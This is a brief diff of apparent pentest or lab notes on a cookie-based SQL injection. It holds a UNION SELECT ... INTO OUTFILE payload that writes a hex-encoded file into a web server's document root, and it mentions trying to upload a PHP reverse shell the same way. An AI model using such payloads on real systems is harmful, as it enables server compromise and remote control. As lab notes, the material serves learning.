@@ -61,7 +61,7 @@ LOAD index.php
 	$sql="INSERTINTOqueueVALUES('".$cookie."',".
 
 UPLOAD FILES in HEX
-Cookie:id='unionselect1,0x48656c6c6f20776f726c640aINTOOUTFILE'/var/www/html/test.php'---
+Cookie:id='unionselect1,0x48656c6c6f20776f726c640a INTO OUTFILE '/var/www/html/test.php' -- -
 	'HelloWorld'
 
 after try convert "php-reverse-shell" in hexa received exceeds server limit
